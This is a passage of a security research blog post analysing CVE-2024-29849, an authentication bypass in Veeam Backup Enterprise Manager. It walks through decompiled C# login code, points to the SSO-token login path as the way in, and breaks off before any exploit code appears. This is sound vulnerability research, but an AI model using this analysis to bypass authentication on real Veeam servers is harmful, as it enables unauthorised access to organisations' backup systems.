<!doctype html><html lang=en><head><meta http-equiv=content-type content="text/html" charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=apple-touch-icon sizes=180x180 href=https://summoning.team/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://summoning.team/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://summoning.team/favicon/favicon-16x16.png><link rel=manifest href=https://summoning.team/favicon/site.webmanifest><link rel=mask-icon href=https://summoning.team/favicon/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title itemprop=name>Bypassing Veeam Authentication CVE-2024-29849</title><meta name=description content="Veeam Backup Enterprise Manager Authentication Bypass"><meta property="og:title" content="Bypassing Veeam Authentication CVE-2024-29849"><meta name=twitter:title content="Bypassing Veeam Authentication CVE-2024-29849"><meta name=twitter:card content="summary_large_image"><meta name=twitter:creator content="@SinSinology"><meta name=twitter:site content="@SinSinology"><meta itemprop=name content="Bypassing Veeam Authentication CVE-2024-29849"><meta name=application-name content="Bypassing Veeam Authentication CVE-2024-29849"><meta property="og:site_name" content="Summoning Team"><meta property="og:type" content="website"><meta property="og:title" content="Summoning Team"><meta property="og:description" content="Veeam Backup Enterprise Manager Authentication Bypass"><meta property="og:site_name" content="Summoning Team"><meta property="og:url" content="https://summoning.team/blog/veeam-enterprise-manager-cve-2024-29849-auth-bypass/"><meta property="og:locale" content="en"><meta property="twitter:image" content="https://summoning.team/../assets/images/featured/veeam-epm-CVE-2024-29849_hu9348ca991627b451f868374b7ab30b92_683945_1200x630_resize_q75_box.jpg"><meta property="og:image" content="https://summoning.team/../assets/images/featured/veeam-epm-CVE-2024-29849_hu9348ca991627b451f868374b7ab30b92_683945_1200x630_resize_q75_box.jpg"><meta property="og:image:secure_url" content="https://summoning.team/../assets/images/featured/veeam-epm-CVE-2024-29849_hu9348ca991627b451f868374b7ab30b92_683945_1200x630_resize_q75_box.jpg"><meta property="og:image:width" content="1000"><meta property="og:image:height" content="667"><meta property="og:type" content="article"><script>localStorage.getItem("color-theme")==="dark"||!("color-theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches?document.documentElement.classList.add("dark"):document.documentElement.classList.remove("dark")</script><link rel=stylesheet href="/css/style.min.121745940f640bfe9053c9acbaf79a598becea9d659395fe6592de763720514d.css" integrity="sha256-EhdFlA9kC/6QU8msuveaWYvs6p1lk5X+ZZLedjcgUU0="></head><body class="bg-zinc-100 dark:bg-gray-800"><div class="top-0 z-50 w-full text-gray-200 bg-gray-900 border-2 border-gray-900 md:sticky border-b-stone-200/10"><div x-data="{ open: false }" class="flex flex-col max-w-full px-4 mx-auto md:items-center md:justify-between md:flex-row md:px-6 lg:px-8"><div class="flex flex-row items-center justify-between p-4"><a href=https://summoning.team/ class="flex text-gray-100 transition duration-1000 ease-in-out group"><img src=https://summoning.team/images/site-logo.svg class="transition-opacity h-9 w-9 group-hover:opacity-50 group-focus:opacity-70" alt="Summoning Team Logo"><div class="mt-1 ml-3 text-xl font-black tracking-tight text-gray-100 transition-colors group-hover:text-gray-400/60">Summoning Team</div></a><button class="rounded-lg md:hidden focus:outline-none focus:shadow-outline" @click="open = !open" role=navigation aria-expanded=false aria-label=Main aria-controls=menuItems><svg fill="currentcolor" viewBox="0 0 20 20" class="w-6 h-6"><path x-show="!open" fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4A1 1 0 013 5zm0 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm6 5a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z" clip-rule="evenodd"/><path x-show="open" fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414.0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"/></svg></button></div><nav :class="{'flex': open, 'hidden': !open}" class="flex-col flex-grow hidden pb-4 md:pb-0 md:flex md:justify-end md:flex-row"><a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-indigo-600 focus:bg-indigo-700 focus:outline-none focus:shadow-outline" href=https://summoning.team/>Training</a>
<a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-indigo-600 focus:bg-indigo-700 focus:outline-none focus:shadow-outline" href=https://summoning.team/blog/>Blog</a>
<a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-indigo-600 focus:bg-indigo-700 focus:outline-none focus:shadow-outline" href=https://summoning.team/exploits/>Exploits</a>
<a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-indigo-600 focus:bg-indigo-700 focus:outline-none focus:shadow-outline" href=https://summoning.team/advisories/>Advisories</a>
<a class="px-4 py-2 mt-2 text-sm font-semibold bg-transparent rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-indigo-600 focus:bg-indigo-700 focus:outline-none focus:shadow-outline" href=https://summoning.team/contact>Contact</a>
<a class="px-4 py-2 mt-2 text-sm font-semibold bg-transparent rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-indigo-600 focus:bg-indigo-700 focus:outline-none focus:shadow-outline" href=https://summoning.team/about>About</a></nav></div></div><article><header class="mb-4 bg-indigo-600"><span class=py-96><h1 class="py-16 text-5xl font-black text-center text-white capitalize">Bypassing Veeam Authentication CVE-2024-29849<br><p style=line-height:1.6></p></h1></span></header><div class="max-w-4xl mx-auto mt-8 mb-2"><div class=px-6><img src=https://summoning.team/../assets/images/featured/veeam-epm-CVE-2024-29849_hu9348ca991627b451f868374b7ab30b92_683945_1500x0_resize_q80_h2_box.webp srcset=", /../assets/images/featured/veeam-epm-CVE-2024-29849_hu9348ca991627b451f868374b7ab30b92_683945_400x0_resize_q80_h2_box.webp 400w, /../assets/images/featured/veeam-epm-CVE-2024-29849_hu9348ca991627b451f868374b7ab30b92_683945_550x0_resize_q80_h2_box.webp 550w, /../assets/images/featured/veeam-epm-CVE-2024-29849_hu9348ca991627b451f868374b7ab30b92_683945_900x0_resize_q80_h2_box.webp 768w, /../assets/images/featured/veeam-epm-CVE-2024-29849_hu9348ca991627b451f868374b7ab30b92_683945_1500x0_resize_q80_h2_box.webp 1100w" class="object-fill overflow-hidden rounded-lg shadow-lg ring-4 ring-zinc-300/40 dark:ring-gray-900/40 shadow-neutral-100/20 dark:shadow-neutral-800/40" width=100% alt></div></div><div class="max-w-4xl px-6 pt-6 pb-16 mx-auto prose dark:prose-invert dark:text-white"><h1 id=tldr>TLDR</h1><p>Veeam published a CVSS 9.8 advisory for a authentication bypass vulnerability CVE-2024-29849, Following is my full analysis and exploit for this issue.</p><p><img src=https://summoning.team/images/blog/veeam-epm/poc.gif alt=veeam-CVE-2024-29849></p><h1 id=introduction-yet-another-tldr>Introduction (yet another TLDR)</h1><p>May 21st, Veeam published an advisory stating that Veeam Backup Enterprise Manager is affected by an authentication bypass allowing an unauthenticated attacker to bypass the authentication and log in to the Veeam Backup Enterprise Manager web interface as any user. , the CVSS for this vulnerability is 9.8.</p><p><a href=https://www.veeam.com/kb4581>Official Advisory States</a>:</p><blockquote><p>This vulnerability in Veeam Backup Enterprise Manager allows an unauthenticated attacker to log in to the Veeam Backup Enterprise Manager web interface as any user. -Critical</p></blockquote><p><img src=https://summoning.team/images/blog/veeam-epm/CVE-2024-29849-advisory.png alt=veeam-CVE-2024-29849></p><h1 id=advanced-net-exploitation>Advanced .NET Exploitation</h1><p>if you had a hard time understanding this blog post but like to learn about .NET Exploitation, I have recently made my <a href=https://summoning.team/>Advanced .NET Exploitation Training</a> public, sign up and let me teach you everything you need about deserialization and how to pop shellz on .net targets.</p><p><a href=https://summoning.team><img src=https://summoning.team/images/blog/traininglogo.png alt=AdvancedNetExploitationTraining title="Advanced .NET Exploitation Training"></a></p><h1 id=lets-begin>Lets begin</h1><p>When I started to analyze this vulnerability, first I was kind of disappointed on how little information veeam provided, just saying the authentication can be bypassed and not much more, however, just knowing it&rsquo;s something to do with <strong>Authentication</strong> and the mitigation suggesting the issue has something to do with the either &ldquo;VeeamEnterpriseManagerSvc&rdquo; or &ldquo;VeeamRESTSvc&rdquo; services, I began my patch diffing routine and realized the entry point, I&rsquo;ll introduce <code>VeeamRESTSvc</code> also known as <code>Veeam.Backup.Enterprise.RestAPIService.exe</code></p><p><img src=https://summoning.team/images/blog/veeam-epm/02.png alt=veeam-CVE-2024-29849></p><p>This service which is installed during the installation of veeam enterprise manager software and listens on port TCP/9398 and as the name implies its a REST API server Which is basically a api version of the main web application which can be found on port TCP/9443</p><p><img src=https://summoning.team/images/blog/veeam-epm/01.png alt=veeam-CVE-2024-29849></p><h1 id=post-exploitation>Post-Exploitation?</h1><p>This time, To prevent damage, the included post-exploitation technique in the poc just retrieves the list of internal file servers which should be enough to let people know the authentication has been bypassed, if you like to go full on APT with &ldquo;post-exploitation&rdquo; possibilities, simply, visit the following <a href="https://helpcenter.veeam.com/docs/backup/em_rest/backup_intro.html?ver=120">API Documentations</a></p><p><img src=https://summoning.team/images/blog/veeam-epm/05.png alt=veeam-CVE-2024-29849></p><h1 id=the-authentication-bypass>The Authentication Bypass</h1><p>I started from <code>Veeam.Backup.Enterprise.RestAPIService.CEnterpriseRestSessionManagerControllerStub.LogInAfterAuthentication</code> , the following method is executed when an authentication request is received, I&rsquo;ll try to isolate differnt parts of the codes provided so you won&rsquo;t get distracted but this is how the full implementation of this method looks like.</p><p>Lets break it down, this method expects 2 arguments, first one being <code>loginSpec</code> which is of type <code>LoginSpecType</code> and the second argument is of type <code>String</code> and its named <code>version</code>.</p><p>First (line 8), the provided version value is checked, not wasting much time here I can tell you the correct value for it should be <code>latest</code> and you can have a look at it by opening the <code>Veeam.Backup.Interaction.RestAPI.VersionNames</code> which is a <code>enum</code></p><p>Now that we are past that, a crucial check is done at line (17), as you can see if either the entire <code>loginSpec</code> or one of its members which is the <code>loginSpec.VMwareSSOToken</code> are not provided, then we&rsquo;ll enter the <code>if</code> clause at line (19), we wan&rsquo;t to avoid this is not where the issue happens, we actually want to hit the <code>else</code> clause which is at line (44)</p><p>Before I begin tearing apart the other methods into pieces, the trained eye notices that if anything goes wrong during the execution of the following statements, there exist multiple <code>try, catch</code> blocks that tell the user the <code>Login failed</code>. We would like to avoid these of course and that&rsquo;s where we are headed, lets go after the <code>LogInBySsoToken</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>override</span> <span style=color:#66d9ef>async</span> Task&lt;HttpResponseMessage&gt; LogInAfterAuthentication(LoginSpecType loginSpec, [FromUri(Name = <span style=color:#e6db74>&#34;v&#34;</span>)] <span style=color:#66d9ef>string</span> version = <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	HttpResponseMessage httpResponseMessage2;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  	<span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  	{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  		Log.SecureMessage(<span style=color:#e6db74>&#34;[Authenticated] Logging on...&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  		VersionNames versionNames;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  		<span style=color:#66d9ef>if</span> (!Enum.TryParse&lt;VersionNames&gt;(version, <span style=color:#66d9ef>out</span> versionNames))
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  			versionNames = VersionNames.latest;
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  		<span style=color:#66d9ef>if</span> (versionNames == VersionNames.latest)
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  			versionNames = Enum.GetValues(<span style=color:#66d9ef>typeof</span>(VersionNames)).Cast&lt;VersionNames&gt;().Last&lt;VersionNames&gt;();
</span></span><span style=display:flex><span><span style=color:#ae81ff>15</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>16</span>:  		CRestSession crestSession;
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span>:  		<span style=color:#66d9ef>if</span> (loginSpec == <span style=color:#66d9ef>null</span> || loginSpec.VMwareSSOToken == <span style=color:#66d9ef>null</span>)
</span></span><span style=display:flex><span><span style=color:#ae81ff>18</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>19</span>:  			CRestAuthorizationHeader authorizationHeader = CWebApiRestOperationContext.GetAuthorizationHeader(<span style=color:#66d9ef>base</span>.Request);
</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span>:  			DateTime utcNow = SManagedDateTime.UtcNow;
</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span>:  			CUserLockout cuserLockout = <span style=color:#66d9ef>new</span> CUserLockout(CInMemoryLockoutData.CreateDefaultCaseInsensitive(authorizationHeader.UserName.Name), SLogonSessions.Instance.LockoutSessings);
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>:  			<span style=color:#66d9ef>if</span> (cuserLockout.IsLocked(utcNow))
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>24</span>:  				<span style=color:#66d9ef>int</span> remainingLockTimeoutInMinutes = cuserLockout.GetRemainingLockTimeoutInMinutes(utcNow);
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span>:  				<span style=color:#66d9ef>string</span> text = <span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;Maximum number of login attempts exceeded. Wait {0} minutes and try again&#34;</span>, remainingLockTimeoutInMinutes);
</span></span><span style=display:flex><span><span style=color:#ae81ff>26</span>:  				<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> CRestAPICommunicationException(RestAPIStatusCodes.Unauthorized, text, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>27</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>28</span>:  			<span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>29</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>30</span>:  				crestSession = SLogonSessions.Instance.LogInByBasicAuthentication(authorizationHeader, loginSpec, versionNames);
</span></span><span style=display:flex><span><span style=color:#ae81ff>31</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>32</span>:  			<span style=color:#66d9ef>catch</span> (CRestAPICommunicationException ex)
</span></span><span style=display:flex><span><span style=color:#ae81ff>33</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>34</span>:  				<span style=color:#66d9ef>if</span> (ex.IsLogonFailure)
</span></span><span style=display:flex><span><span style=color:#ae81ff>35</span>:  				{
</span></span><span style=display:flex><span><span style=color:#ae81ff>36</span>:  					cuserLockout.OnLoginFailure(utcNow);
</span></span><span style=display:flex><span><span style=color:#ae81ff>37</span>:  				}
</span></span><span style=display:flex><span><span style=color:#ae81ff>38</span>:  				<span style=color:#66d9ef>throw</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>39</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>40</span>:  			cuserLockout.OnLoginSuccess();
</span></span><span style=display:flex><span><span style=color:#ae81ff>41</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>42</span>:  		<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>43</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>44</span>:  			crestSession = SLogonSessions.Instance.LogInBySsoToken(loginSpec, versionNames);
</span></span><span style=display:flex><span><span style=color:#ae81ff>45</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>46</span>:  		LogonSessionType logonSessionType = crestSession.MakeSessionEntity();
</span></span><span style=display:flex><span><span style=color:#ae81ff>47</span>:  		HttpResponseMessage httpResponseMessage = <span style=color:#66d9ef>base</span>.Request.CreateResponse(HttpStatusCode.Created, logonSessionType);
</span></span><span style=display:flex><span><span style=color:#ae81ff>48</span>:  		<span style=color:#66d9ef>if</span> (CWebApiRestOperationContext.GetUseCsrfTokenValue(<span style=color:#66d9ef>base</span>.Request))
</span></span><span style=display:flex><span><span style=color:#ae81ff>49</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>50</span>:  			<span style=color:#66d9ef>string</span> base64String = CUserSecurityToken.CreateNew().GetBase64String();
</span></span><span style=display:flex><span><span style=color:#ae81ff>51</span>:  			crestSession.SessionContext.SetSecurityToken(base64String);
</span></span><span style=display:flex><span><span style=color:#ae81ff>52</span>:  			CWebApiRestOperationContext.SetSessionCsrfToken(httpResponseMessage, base64String);
</span></span><span style=display:flex><span><span style=color:#ae81ff>53</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>54</span>:  		CWebApiRestOperationContext.SetSessionIdCookieAndHeader(httpResponseMessage, crestSession.SessionId);
</span></span><span style=display:flex><span><span style=color:#ae81ff>55</span>:  		httpResponseMessage.Headers.Location = <span style=color:#66d9ef>new</span> Uri(LogonSessionResourceSettings.Hrefs.ForLogonSession(crestSession.SessionId, <span style=color:#66d9ef>true</span>).ToString(), UriKind.Absolute);
</span></span><span style=display:flex><span><span style=color:#ae81ff>56</span>:  		httpResponseMessage2 = httpResponseMessage;
</span></span><span style=display:flex><span><span style=color:#ae81ff>57</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>58</span>:  	<span style=color:#66d9ef>catch</span> (CRestAPICommunicationException ex2)
</span></span><span style=display:flex><span><span style=color:#ae81ff>59</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>60</span>:  		CRestLogger.ExceptionWithOperationContext(<span style=color:#66d9ef>base</span>.ActionContext, ex2, <span style=color:#e6db74>&#34;Login failed.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>61</span>:  		<span style=color:#66d9ef>throw</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>62</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>63</span>:  	<span style=color:#66d9ef>catch</span> (SecurityException ex3)
</span></span><span style=display:flex><span><span style=color:#ae81ff>64</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>65</span>:  		CRestLogger.ExceptionWithOperationContext(<span style=color:#66d9ef>base</span>.ActionContext, ex3, <span style=color:#e6db74>&#34;Login failed.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>66</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> CRestAPICommunicationException(RestAPIStatusCodes.Unauthorized, ex3.Message, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>67</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>68</span>:  	<span style=color:#66d9ef>catch</span> (Exception ex4)
</span></span><span style=display:flex><span><span style=color:#ae81ff>69</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>70</span>:  		CRestLogger.ExceptionWithOperationContext(<span style=color:#66d9ef>base</span>.ActionContext, ex4, <span style=color:#e6db74>&#34;Login failed.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>71</span>:  		<span style=color:#66d9ef>throw</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>72</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>73</span>:  	<span style=color:#66d9ef>return</span> httpResponseMessage2;
</span></span><span style=display:flex><span><span style=color:#ae81ff>74</span>:  }
</span></span></code></pre></div><p>Following is the implementation of the <code>Veeam.Backup.Enterprise.RestAPIService.CWebApiRestLogonSessionsScope.LogInBySsoToken</code></p><p>as one can tell, this method expects the two previous arguments, the <code>loginSpec</code> and <code>ver</code>, and it uses the <code>loginSpec</code> argument to call another method named <code>AuthorizeByVMwareSsoToken</code>, to be more accurate, it uses the <code>VMwareSSOToken</code> member of the <code>loginSpec</code>, lets see what exactly this argument should look like and then we&rsquo;ll analyze the <code>AuthorizeByVMwareSsoToken</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  <span style=color:#66d9ef>public</span> CRestSession LogInBySsoToken(LoginSpecType loginSpec, VersionNames ver)
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  	CRestSession crestSession2;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  	<span style=color:#66d9ef>using</span> (CAutoRefScope cautoRefScope = <span style=color:#66d9ef>new</span> CAutoRefScope())
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  	{
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  		CUserSessionContextData&lt;CWinLoginDependantInfo&gt; cuserSessionContextData = <span style=color:#66d9ef>this</span>._authMngr.AuthorizeByVMwareSsoToken(loginSpec.VMwareSSOToken);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  		CAutoRef&lt;CUserSessionContextHolder&gt; cautoRef = <span style=color:#66d9ef>new</span> CAutoRef&lt;CUserSessionContextHolder&gt;(cautoRefScope, cuserSessionContextData.ContextHolder);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  		CRestSession crestSession = <span style=color:#66d9ef>this</span>._restSessionMngr.CreateNewSession(cautoRef, cuserSessionContextData.LoginInfo, <span style=color:#66d9ef>null</span>, ver, <span style=color:#66d9ef>this</span>.License, <span style=color:#66d9ef>this</span>._licenseMngr);
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  		Log.SecureMessage(<span style=color:#e6db74>&#34;User [{0}] was successfully logged on by token.&#34;</span>, <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>object</span>[] { cautoRef.Get().Context.UserName });
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  		cautoRefScope.Commit();
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  		crestSession2 = crestSession;
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  	<span style=color:#66d9ef>return</span> crestSession2;
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  }
</span></span></code></pre></div><p>This class type is very simple, it has multiple members of different types:</p><ul><li><code>public string VMwareSSOToken</code></li><li><code>public TenantCredentialsInfoType TenantCredentials</code></li><li><code>public VCloudOrganizationCredentialsInfoType VCloudOrganizationCredentials</code></li><li>however based on what we can see, the <code>VMwareSSOToken</code> has been used, so later, we are building our exploit, we can choose to only provide this class property member.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span> <span style=color:#ae81ff>1</span>:  <span style=color:#66d9ef>using</span> System;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>2</span>:  <span style=color:#66d9ef>using</span> System.CodeDom.Compiler;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>3</span>:  <span style=color:#66d9ef>using</span> System.ComponentModel;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>:  <span style=color:#66d9ef>using</span> System.Runtime.Serialization;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>5</span>:  <span style=color:#66d9ef>using</span> System.Xml.Serialization;
</span></span><span style=display:flex><span> <span style=color:#ae81ff>6</span>:  
</span></span><span style=display:flex><span> <span style=color:#ae81ff>7</span>:  <span style=color:#66d9ef>namespace</span> Veeam.Backup.Interaction.RestAPI.Resources
</span></span><span style=display:flex><span> <span style=color:#ae81ff>8</span>:  {
</span></span><span style=display:flex><span> <span style=color:#ae81ff>9</span>:  	[GeneratedCode(<span style=color:#e6db74>&#34;System.Xml&#34;</span>, <span style=color:#e6db74>&#34;4.7.3056.0&#34;</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>10</span>:  	[DesignerCategory(<span style=color:#e6db74>&#34;code&#34;</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>:  	[XmlType(Namespace = <span style=color:#e6db74>&#34;http://www.veeam.com/ent/v1.0&#34;</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>12</span>:  	[XmlRoot(<span style=color:#e6db74>&#34;LoginSpec&#34;</span>, Namespace = <span style=color:#e6db74>&#34;http://www.veeam.com/ent/v1.0&#34;</span>, IsNullable = <span style=color:#66d9ef>false</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>13</span>:  	[DataContract(Name = <span style=color:#e6db74>&#34;LoginSpec&#34;</span>, Namespace = <span style=color:#e6db74>&#34;&#34;</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>14</span>:  	[Serializable]
</span></span><span style=display:flex><span><span style=color:#ae81ff>15</span>:  	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>LoginSpecType</span> : SpecType
</span></span><span style=display:flex><span><span style=color:#ae81ff>16</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>17</span>:  		[XmlElement(Order = <span style=color:#ae81ff>0</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>18</span>:  		[DataMember(Name = <span style=color:#e6db74>&#34;VMwareSSOToken&#34;</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>19</span>:  		<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>string</span> VMwareSSOToken
</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>21</span>:  			<span style=color:#66d9ef>get</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>22</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>23</span>:  				<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.vMwareSSOTokenField;
</span></span><span style=display:flex><span><span style=color:#ae81ff>24</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>25</span>:  			<span style=color:#66d9ef>set</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>26</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>27</span>:  				<span style=color:#66d9ef>this</span>.vMwareSSOTokenField = <span style=color:#66d9ef>value</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>28</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>29</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>30</span>:  
</span></span><span style=display:flex><span><span style=color:#ae81ff>31</span>:  		[XmlElement(Order = <span style=color:#ae81ff>1</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>32</span>:  		[DataMember(Name = <span style=color:#e6db74>&#34;TenantCredentials&#34;</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>33</span>:  		<span style=color:#66d9ef>public</span> TenantCredentialsInfoType TenantCredentials
</span></span><span style=display:flex><span><span style=color:#ae81ff>34</span>:  		{
</span></span><span style=display:flex><span><span style=color:#ae81ff>35</span>:  			<span style=color:#66d9ef>get</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>36</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>37</span>:  				<span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span>.tenantCredentialsField;
</span></span><span style=display:flex><span><span style=color:#ae81ff>38</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>39</span>:  			<span style=color:#66d9ef>set</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>40</span>:  			{
</span></span><span style=display:flex><span><span style=color:#ae81ff>41</span>:  				<span style=color:#66d9ef>this</span>.tenantCredentialsField = <span style=color:#66d9ef>value</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>42</span>:  			}
</span></span><span style=display:flex><span><span style=color:#ae81ff>43</span>:  		}
</span></span><span style=display:flex><span><span style=color:#ae81ff>44</span>:  
</span></span><span style=display:flex><span><span style=color:#ae81ff>45</span>:  		[XmlElement(Order = <span style=color:#ae81ff>2</span>)]
</span></span><span style=display:flex><span><span style=color:#ae81ff>46</span>:  		[DataMember(Name = <span style=color:#e6db74>&#34;VCloudOrganizationCredentials&#34;</span>)]
